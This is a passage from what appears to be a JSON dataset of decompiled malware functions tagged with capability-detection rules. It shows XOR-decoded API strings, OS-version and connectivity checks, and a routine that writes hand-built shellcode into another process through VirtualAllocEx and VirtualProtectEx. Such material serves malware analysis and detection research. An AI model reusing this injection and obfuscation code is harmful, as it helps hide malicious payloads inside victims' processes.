*(&fcn.00401e10::var_90h + var_14h) ^ (&stack0xffffffb4)[var_14h % 5]);\n                    }\n                    uVar1 = fcn.00401270();\n                    *0x43679c = fcn.0041c160(var_20h, uVar1);\n                    *0x4367a0 = *0x43679c >> 0x1f;\n                    if ((*0x43679c | *0x4367a0) == 0) {\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                    }\n                    else {\n                        var_28h = 0;\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                    }\n                }\n            }\n        }\n    }\n    if (var_28h == 0) {\n        puVar3 = 0x43678c;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *arg_8h = *puVar3;\n            puVar3 = puVar3 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    return var_28h;\n}\n",
        "token_count": 2695
    },
    "00402290": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402290(uchar *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint var_8ch;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uint var_74h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uint8_t var_44h [4];\n    uchar var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_24h = 0;\n    if ((((*0x4367a4 | *0x4367a8) == 0) || ((*0x4367ac | *0x4367b0) == 0)) || ((*0x4367b4 | *0x4367b8) == 0)) {\n        var_24h = 0x7f;\n        var_50h._0_1_ = 0x27;\n        var_50h._1_1_ = 0x1f;\n        var_50h._2_1_ = 5;\n        var_50h._3_1_ = 1;\n        var_4ch = 0x3d;\n        var_4bh = 0x67;\n        var_4ah = 0xf;\n        var_49h = 0xd;\n        var_48h = 1;\n        var_47h = 0x51;\n        var_2ch._0_1_ = 0x49;\n        var_2ch._1_1_ = 0x6b;\n        var_2ch._2_1_ = 0x61;\n        var_2ch._3_1_ = 0x6d;\n        var_28h = 0x51;\n        fcn.004012a0(10);\n        for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n            fcn.00401280(var_8h, *(&var_50h + var_8h) ^ *(&var_2ch + var_8h % 5));\n        }\n        var_5ch._0_1_ = 0x22;\n        var_5ch._1_1_ = 0x20;\n        var_5ch._2_1_ = 0x42;\n        var_5ch._3_1_ = 0x24;\n        var_58h = 0xd;\n        var_57h = 0xf;\n        var_56h = 0x20;\n        var_55h = 0x74;\n        var_54h = 4;\n        var_53h = 0xe;\n        var_52h = 0x6e;\n        var_34h._0_1_ = 0x6e;\n        var_34h._1_1_ = 0x44;\n        var_34h._2_1_ = 0x30;\n        var_34h._3_1_ = 0x68;\n        var_30h = 0x62;\n        fcn.004012a0(0xb);\n        for (var_ch = 0; var_ch < 0xb; var_ch = var_ch + 1) {\n            fcn.00401280(var_ch, *(&var_5ch + var_ch) ^ *(&var_34h + var_ch % 5));\n        }\n        uVar1 = fcn.00401270();\n        uVar2 = fcn.00401270();\n        *0x4367a4 = fcn.0041daa0(arg_ch, uVar2, uVar1);\n        if (*0x4367a4 == 0) {\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        else {\n            var_74h._0_1_ = 0x74;\n            var_74h._1_1_ = 0x1e;\n            var_74h._2_1_ = 0x1f;\n            var_74h._3_1_ = 6;\n            var_70h = 0x56;\n            var_6fh = 0x4c;\n            var_6eh = 0x2a;\n            var_6dh = 0x1f;\n            var_6ch = 0x2e;\n            var_6bh = 0x50;\n            var_6ah = 0x5d;\n            var_69h = 0x1e;\n            var_68h = 0x18;\n            var_67h = 0x33;\n            var_66h = 0x56;\n            var_65h = 0x79;\n            var_64h = 0x1e;\n            var_63h = 9;\n            var_62h = 0x33;\n            var_61h = 0x56;\n            var_60h = 0x4b;\n            var_5fh = 9;\n            var_5eh = 0x6d;\n            var_3ch._0_1_ = 0x38;\n            var_3ch._1_1_ = 0x7a;\n            var_3ch._2_1_ = 0x6d;\n            var_3ch._3_1_ = 0x41;\n            var_38h = 0x33;\n            fcn.004012a0(0x17);\n            for (var_10h = 0; var_10h < 0x17; var_10h = var_10h + 1) {\n                fcn.00401280(var_10h, *(&var_74h + var_10h) ^ *(&var_3ch + var_10h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar2 = fcn.00401270();\n            *0x4367ac = fcn.0041daa0(arg_ch, uVar2, uVar1);\n            if (*0x4367ac == 0) {\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n            }\n            else {\n                var_8ch._0_1_ = 0x16;\n                var_8ch._1_1_ = 0x44;\n                var_8ch._2_1_ = 5;\n                var_8ch._3_1_ = 0x3e;\n                var_88h = 0x20;\n                var_87h = 0x38;\n                var_86h = 0x56;\n                var_85h = 0x36;\n                var_84h = 0x38;\n                var_83h = 0x19;\n                var_82h = 0x25;\n                var_81h = 0x41;\n                var_80h = 0x21;\n                var_7fh = 0x39;\n                var_7eh = 0x2e;\n                var_7dh = 0x20;\n                var_7ch = 0x7e;\n                var_7bh = 0x30;\n                var_7ah = 0x21;\n                var_79h = 0x20;\n                var_78h = 0x3e;\n                var_77h = 0x4a;\n                var_76h = 0x55;\n                var_44h[0] = 0x4c;\n                var_44h[1] = 0x33;\n                var_44h[2] = 0x55;\n                var_44h[3] = 0x4c;\n                var_40h = 0x4f;\n                fcn.004012a0(0x17);\n                for (var_14h = 0; var_14h < 0x17; var_14h = var_14h + 1) {\n                    fcn.00401280(var_14h, *(&var_8ch + var_14h) ^ var_44h[var_14h % 5]);\n                }\n                uVar1 = fcn.00401270();\n                uVar2 = fcn.00401270();\n                *0x4367b4 = fcn.0041daa0(arg_ch, uVar2, uVar1);\n                if (*0x4367b4 == 0) {\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n                else {\n                    var_24h = 0;\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                }\n            }\n        }\n    }\n    if (var_24h == 0) {\n        puVar4 = 0x4367a4;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *arg_8h = *puVar4;\n            puVar4 = puVar4 + 1;\n            arg_8h = arg_8h + 1;\n        }\n    }\n    *0x4367b8 = *0x4367b4 >> 0x20;\n    *0x4367b0 = *0x4367ac >> 0x20;\n    *0x4367a8 = *0x4367a4 >> 0x20;\n    return var_24h;\n}\n",
        "token_count": 2628
    },
    "004026f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004026f0(int32_t *hProcess, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t arg_ch_00;\n    uint *arg_10h_00;\n    uint noname_17;\n    uint *arg_10h_01;\n    uint *arg_10h_02;\n    uint noname_25;\n    uint *arg_10h_03;\n    uint noname_29;\n    int32_t hProcess_00;\n    uint arg_14h_00;\n    uint arg_18h_00;\n    uint var_390h;\n    uint var_388h;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    char cStack636;\n    char cStack634;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    int32_t var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    int32_t var_1b8h;\n    int32_t var_1b4h;\n    uchar var_1adh;\n    uchar var_1ach;\n    uchar var_1abh;\n    uchar var_1aah;\n    uchar var_1a9h;\n    uchar var_1a8h;\n    uchar var_1a7h;\n    uchar var_1a6h;\n    uchar var_1a5h;\n    uchar var_1a4h;\n    uchar var_1a3h;\n    uchar var_1a2h;\n    uchar var_1a1h;\n    uchar var_1a0h;\n    uchar var_19fh;\n    uchar var_19eh;\n    uchar var_19dh;\n    uchar var_19ch;\n    uchar var_19bh;\n    uchar var_19ah;\n    uchar var_199h;\n    uchar var_198h;\n    uchar var_197h;\n    uchar var_196h;\n    uchar var_195h;\n    uchar var_194h;\n    uchar var_193h;\n    uchar var_192h;\n    uchar var_191h;\n    uchar var_190h;\n    uchar var_18fh;\n    uchar var_18eh;\n    uchar var_18dh;\n    uchar var_18ch;\n    uchar var_18bh;\n    uchar var_18ah;\n    uchar var_189h;\n    uchar var_188h;\n    uchar var_187h;\n    uchar var_186h;\n    uchar var_185h;\n    uchar var_184h;\n    uchar var_183h;\n    uchar var_182h;\n    uchar var_181h;\n    uchar var_180h;\n    uchar var_17fh;\n    uchar var_17eh;\n    uchar var_17dh;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uchar var_178h;\n    uchar var_177h;\n    uchar var_176h;\n    uchar var_175h;\n    uchar var_174h;\n    uchar var_173h;\n    uchar var_172h;\n    uchar var_171h;\n    uchar var_170h;\n    uchar var_16fh;\n    uchar var_16eh;\n    uchar var_16dh;\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uchar var_169h;\n    uchar var_168h;\n    uchar var_167h;\n    uchar var_166h;\n    uchar var_165h;\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uchar var_161h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uint var_15bh;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    int32_t var_152h;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uchar var_141h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    ulong var_12dh;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    int32_t var_11ch;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uint var_ech;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uint var_d4h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uint var_c0h;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uint var_9ch;\n    uchar var_98h;\n    int32_t var_97h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uint var_90h;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uint var_88h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uint8_t var_7ch [4];\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uint8_t var_74h [4];\n    uchar var_70h;\n    uint var_6ch;\n    uchar var_68h;\n    uint var_64h;\n    uchar var_60h;\n    uint var_5ch;\n    uchar var_58h;\n    uint var_54h;\n    int32_t var_4ch;\n    uchar var_44h;\n    uchar var_43h;\n    int32_t var_42h;\n    int32_t var_3eh;\n    uchar var_3ah;\n    uchar var_39h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t lpAddress;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpflOldProtect;\n    \n    var_1c8h = 0;\n    lpflOldProtect = 0;\n    *arg_18h = 0;\n    if (((arg_14h & 0x10) == 0) && ((*0x436b50 & 1) != 0)) {\n        var_c0h._0_1_ = 0x27;\n        var_c0h._1_1_ = 0x1f;\n        var_c0h._2_1_ = 5;\n        var_c0h._3_1_ = 1;\n        var_bch = 0x3d;\n        var_bbh = 0x67;\n        var_bah = 0xf;\n        var_b9h = 0xd;\n        var_b8h = 1;\n        var_b7h = 0x51;\n        var_5ch._0_1_ = 0x49;\n        var_5ch._1_1_ = 0x6b;\n        var_5ch._2_1_ = 0x61;\n        var_5ch._3_1_ = 0x6d;\n        var_58h = 0x51;\n        fcn.004012a0(10);\n        for (var_10h = 0; var_10h < 10; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&fcn.004026f0::var_c0h + var_10h) ^ *(&fcn.004026f0::var_5ch + var_10h % 5));\n        }\n        var_d4h._0_1_ = 99;\n        var_d4h._1_1_ = 0x13;\n        var_d4h._2_1_ = 0x1b;\n        var_d4h._3_1_ = 0x75;\n        var_d0h = 0x37;\n        var_cfh = 0x54;\n        var_ceh = 6;\n        var_cdh = 3;\n        var_cch = 0x53;\n        var_cbh = 0x10;\n        var_cah = 0x42;\n        var_c9h = 2;\n        var_c8h = 5;\n        var_c7h = 0x62;\n        var_c6h = 0x2d;\n        var_c5h = 0x43;\n        var_c4h = 2;\n        var_c3h = 0x16;\n        var_c2h = 0x52;\n        var_c1h = 0x45;\n        var_64h._0_1_ = 0x31;\n        var_64h._1_1_ = 0x67;\n        var_64h._2_1_ = 0x77;\n        var_64h._3_1_ = 0x36;\n        var_60h = 0x45;\n        arg_18h_00 = 0x14;\n        fcn.004012a0(0x14);\n        for (var_14h = 0; var_14h < 0x14; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, *(&fcn.004026f0::var_d4h + var_14h) ^ *(&fcn.004026f0::var_64h + var_14h % 5));\n        }\n        var_200h = fcn.0041d4d0();\n        var_7ch[0] = 0x20;\n        var_7ch[1] = 0x30;\n        var_7ch[2] = 0xc;\n        var_7ch[3] = 0x3a;\n        var_78h = 0x23;\n        var_77h = 9;\n        var_76h = 0x22;\n        var_75h = 0x4f;\n        var_6ch._0_1_ = 0x7a;\n        var_6ch._1_1_ = 0x47;\n        var_6ch._2_1_ = 0x4f;\n        var_6ch._3_1_ = 0x56;\n        var_68h = 0x4c;\n        arg_14h_00 = 8;\n        fcn.004012a0(8);\n        for (var_18h = 0; var_18h < 8; var_18h = var_18h + 1) {\n            fcn.00401280(var_18h, (&stack0xffffff80)[var_18h] ^ *(&fcn.004026f0::var_6ch + var_18h % 5));\n        }\n        uVar1 = fcn.00401270();\n        uVar2 = fcn.00401270();\n        _var_38h = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n        var_ech._0_1_ = 0x16;\n        var_ech._1_1_ = 0x44;\n        var_ech._2_1_ = 5;\n        var_ech._3_1_ = 0x3e;\n        var_e8h = 0x20;\n        var_e7h = 0x38;\n        var_e6h = 0x56;\n        var_e5h = 0x36;\n        var_e4h = 0x38;\n        var_e3h = 0x19;\n        var_e2h = 0x25;\n        var_e1h = 0x41;\n        var_e0h = 0x21;\n        var_dfh = 0x39;\n        var_deh = 0x2e;\n        var_ddh = 0x20;\n        var_dch = 0x7e;\n        var_dbh = 0x30;\n        var_dah = 0x21;\n        var_d9h = 0x20;\n        var_d8h = 0x3e;\n        var_d7h = 0x4a;\n        var_d6h = 0x55;\n        var_74h[0] = 0x4c;\n        var_74h[1] = 0x33;\n        var_74h[2] = 0x55;\n        var_74h[3] = 0x4c;\n        var_70h = 0x4f;\n        fcn.004012a0(0x17);\n        for (var_1ch = 0; var_1ch < 0x17; var_1ch = var_1ch + 1) {\n            fcn.00401280(var_1ch, *(&fcn.004026f0::var_ech + var_1ch) ^ (&stack0xffffff88)[var_1ch % 5]);\n        }\n        uVar1 = fcn.00401270();\n        uVar2 = fcn.00401270();\n        _var_1d4h = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n        uVar1 = fcn.00401270();\n        uVar2 = fcn.00401270();\n        _var_1fch = fcn.0041daa0(0xffffffff, uVar2, uVar1);\n        _var_288h = CONCAT44(var_284h, var_288h);\n        var_12dh = CONCAT44(var_12dh._4_4_, var_12dh);\n        _var_1f0h = CONCAT44(var_1ech, var_1f0h);\n        if (_var_38h != 0) {\n            var_280h._0_1_ = 0;\n            sub.ntdll.dll_memset(&fcn.004026f0::var_280h + 1, 0, 0x7f);\n            var_1e0h = 0;\n            iVar3 = fcn.0041d4a0(0xffffffff, var_38h, var_34h, &fcn.004026f0::var_280h, 0x80, &fcn.004026f0::var_1e0h);\n            _var_288h = CONCAT44(var_284h, var_288h);\n            var_12dh = CONCAT44(var_12dh._4_4_, var_12dh);\n            _var_1f0h = CONCAT44(var_1ech, var_1f0h);\n            if (iVar3 != 0) {\n                var_20h = 0;\n                if (cStack634 == -0x3d) {\n                    var_20h = 0xb;\n                }\n                else if (cStack636 == -10) {\n                    var_20h = 0x10;\n                }\n                for (var_1b8h = 0; var_1b8h < 0x20; var_1b8h = var_1b8h + 8) {\n                }\n                _var_288h = CONCAT44(var_284h, var_288h);\n                var_12dh = CONCAT44(var_12dh._4_4_, var_12dh);\n                _var_1f0h = CONCAT44(var_1ech, var_1f0h);\n                if (var_20h != 0) {\n                    var_4ch._0_1_ = 0xff;\n                    var_4ch._1_1_ = 0x24;\n                    var_4ch._2_1_ = 0x25;\n                    stack0xffffffb3 = 0x11223344;\n                    var_44h = 0x48;\n                    var_43h = 0xb8;\n                    var_42h = 0x44332211;\n                    var_3eh = -0x778899ab;\n                    var_3ah = 0xff;\n                    var_39h = 0xe0;\n                    var_1b4h._0_1_ = 0x48;\n                    var_1b4h._1_1_ = 199;\n                    var_1b4h._2_1_ = 0xc0;\n                    stack0xfffffe4b = 0x33443344;\n                    var_1adh = 0x83;\n                    var_1ach = 0x38;\n                    var_1abh = 1;\n                    var_1aah = 0xf;\n                    var_1a9h = 0x84;\n                    var_1a8h = 0xb4;\n                    var_1a7h = 0;\n                    var_1a6h = 0;\n                    var_1a5h = 0;\n                    var_1a4h = 199;\n                    var_1a3h = 0;\n                    var_1a2h = 1;\n                    var_1a1h = 0;\n                    var_1a0h = 0;\n                    var_19fh = 0;\n                    var_19eh = 0x48;\n                    var_19dh = 0x89;\n                    var_19ch = 0x48;\n                    var_19bh = 8;\n                    var_19ah = 0x48;\n                    var_199h = 0x89;\n                    var_198h = 0x50;\n                    var_197h = 0x10;\n                    var_196h = 0x48;\n                    var_195h = 0x89;\n                    var_194h = 0x78;\n                    var_193h = 0x18;\n                    var_192h = 0x48;\n                    var_191h = 0x89;\n                    var_190h = 0x70;\n                    var_18fh = 0x20;\n                    var_18eh = 0x4c;\n                    var_18dh = 0x89;\n                    var_18ch = 0x40;\n                    var_18bh = 0x28;\n                    var_18ah = 0x4c;\n                    var_189h = 0x89;\n                    var_188h = 0x48;\n                    var_187h = 0x30;\n                    var_186h = 0x4c;\n                    var_185h = 0x89;\n                    var_184h = 0x50;\n                    var_183h = 0x38;\n                    var_182h = 0x4c;\n                    var_181h = 0x89;\n                    var_180h = 0x58;\n                    var_17fh = 0x40;\n                    var_17eh = 0x48;\n                    var_17dh = 0x89;\n                    var_17ch = 0x58;\n                    var_17bh = 0x48;\n                    var_17ah = 0x48;\n                    var_179h = 0x89;\n                    var_178h = 0x68;\n                    var_177h = 0x50;\n                    var_176h = 0x48;\n                    var_175h = 0x83;\n                    var_174h = 0xec;\n                    var_173h = 0x58;\n                    var_172h = 0x48;\n                    var_171h = 199;\n                    var_170h = 0x44;\n                    var_16fh = 0x24;\n                    var_16eh = 0x48;\n                    var_16dh = 0;\n                    var_16ch = 0;\n                    var_16bh = 0;\n                    var_16ah = 0;\n                    var_169h = 0x48;\n                    var_168h = 199;\n                    var_167h = 0x44;\n                    var_166h = 0x24;\n                    var_165h = 0x40;\n                    var_164h = 0;\n                    var_163h = 0;\n                    var_162h = 0;\n                    var_161h = 0;\n                    var_160h = 0x48;\n                    var_15fh = 199;\n                    var_15eh = 0x44;\n                    var_15dh = 0x24;\n                    var_15ch = 0x38;\n                    var_15bh = 0;\n                    var_157h = 0x48;\n                    var_156h = 199;\n                    var_155h = 0x44;\n                    var_154h = 0x24;\n                    var_153h = 0x30;\n                    var_152h = 0;\n                    var_14eh = 0x48;\n                    var_14dh = 199;\n                    var_14ch = 0x44;\n                    var_14bh = 0x24;\n                    var_14ah = 0x28;\n                    var_149h = 0;\n                    var_148h = 0;\n                    var_147h = 0;\n                    var_146h = 0;\n                    var_145h = 0x48;\n                    var_144h = 199;\n                    var_143h = 0x44;\n                    var_142h = 0x24;\n                    var_141h = 0x20;\n                    var_140h = 0;\n                    var_13fh = 0;\n                    var_13eh = 0;\n                    var_13dh = 0;\n                    var_13ch = 0x4d;\n                    var_13bh = 0x31;\n                    var_13ah = 0xc9;\n                    var_139h = 0x4d;\n                    var_138h = 0x31;\n                    var_137h = 0xc0;\n                    var_136h = 0x48;\n                    var_135h = 0x31;\n                    var_134h = 0xd2;\n                    var_133h = 0x48;\n                    var_132h = 0x83;\n                    var_131h = 0xc9;\n                    var_130h = 0xff;\n                    var_12fh = 0x48;\n                    var_12eh = 0xb8;\n                    var_12dh._0_4_ = 0x55667788;\n                    var_12dh._4_4_ = 0x11223344;\n                    var_125h = 0xff;\n                    var_124h = 0xd0;\n                    var_123h = 0x48;\n                    var_122h = 0x83;\n                    var_121h = 0xc4;\n                    var_120h = 0x58;\n                    var_11fh = 0x48;\n                    var_11eh = 199;\n                    var_11dh = 0xc0;\n                    var_11ch = 0x33443344;\n                    var_118h = 0x48;\n                    var_117h = 0x8b;\n                    var_116h = 0x48;\n                    var_115h = 8;\n                    var_114h = 0x48;\n                    var_113h = 0x8b;\n                    var_112h = 0x50;\n                    var_111h = 0x10;\n                    var_110h = 0x48;\n                    var_10fh = 0x8b;\n                    var_10eh = 0x78;\n                    var_10dh = 0x18;\n                    var_10ch = 0x48;\n                    var_10bh = 0x8b;\n                    var_10ah = 0x70;\n                    var_109h = 0x20;\n                    var_108h = 0x4c;\n                    var_107h = 0x8b;\n                    var_106h = 0x40;\n                    var_105h = 0x28;\n                    var_104h = 0x4c;\n                    var_103h = 0x8b;\n                    var_102h = 0x48;\n                    var_101h = 0x30;\n                    var_100h = 0x4c;\n                    var_ffh = 0x8b;\n                    var_feh = 0x50;\n                    var_fdh = 0x38;\n                    var_fch = 0x4c;\n                    var_fbh = 0x8b;\n                    var_fah = 0x58;\n                    var_f9h = 0x40;\n                    var_f8h = 0x48;\n                    var_f7h = 0x8b;\n                    var_f6h = 0x58;\n                    var_f5h = 0x48;\n                    var_f4h = 0x48;\n                    var_f3h = 0x8b;\n                    var_f2h = 0x68;\n                    var_f1h = 0x50;\n                    var_f0h = 0x90;\n                    var_8h = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*hProcess, 0, 0x200, 0x3000, 0x20);\n                    iVar3 = 0x110;\n                    var_2ch = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*hProcess, 0, 0x110, 0x3000, 4);\n                    uVar1 = 0x3000;\n                    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(*hProcess, 0, 0xc, 0x3000, 0x20);\n                    if ((lpAddress != 0) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                          (*hProcess, lpAddress, 0xc, 0x40, &fcn.004026f0::lpflOldProtect),  iVar4 != 0)\n                       ) {\n                        var_3eh = arg_ch >> 0x1f;\n                        var_42h = arg_ch;\n                        iVar3 = fcn.004040c0(*hProcess, lpAddress, &stack0xffffffb8, 0xc);\n                        if (iVar3 != 0) {\n                            arg_ch = lpAddress;\n                        }\n                        iVar3 = lpAddress;\n                        (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                  (*hProcess, lpAddress, 0xc, lpflOldProtect, &fcn.004026f0::lpflOldProtect);\n                    }\n                    _var_288h = CONCAT44(var_284h, var_288h);\n                    var_12dh = CONCAT44(var_12dh._4_4_, var_12dh);\n                    _var_1f0h = CONCAT44(var_1ech, var_1f0h);\n                    if (((var_8h != 0) &&\n                        (_var_288h = CONCAT44(var_284h, var_288h),  var_12dh = CONCAT44(var_12dh._4_4_, var_12dh), \n                        _var_1f0h = CONCAT44(var_1ech, var_1f0h),  var_2ch != 0)) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_VirtualProtectEx)\n                                          (*hProcess, var_8h, 0x200, 0x40, &fcn.004026f0::lpflOldProtect),  iVar4 != 0))\n                    {\n                        stack0xfffffe4b = var_2ch;\n                        var_11ch = var_2ch;\n                        var_15bh = arg_10h;\n                        var_152h = arg_ch;\n                        _var_390h = 0;\n                        uVar2 = 0x403303;\n                        var_12dh = _var_1fch;\n                        sub.ntdll.dll_memset(&fcn.004026f0::var_388h, 0, 0x108);\n                        _var_288h = _var_38h + -0x24;\n                        *0x8 = var_2ch + 0x108;\n                        noname_29 = 0x110;\n                        arg_10h_03 = &fcn.004026f0::var_390h;\n                        iVar4 = var_2ch;\n                        iVar5 = fcn.004040c0(*hProcess, var_2ch, arg_10h_03, 0x110);\n                        if (iVar5 != 0) {\n                            noname_25 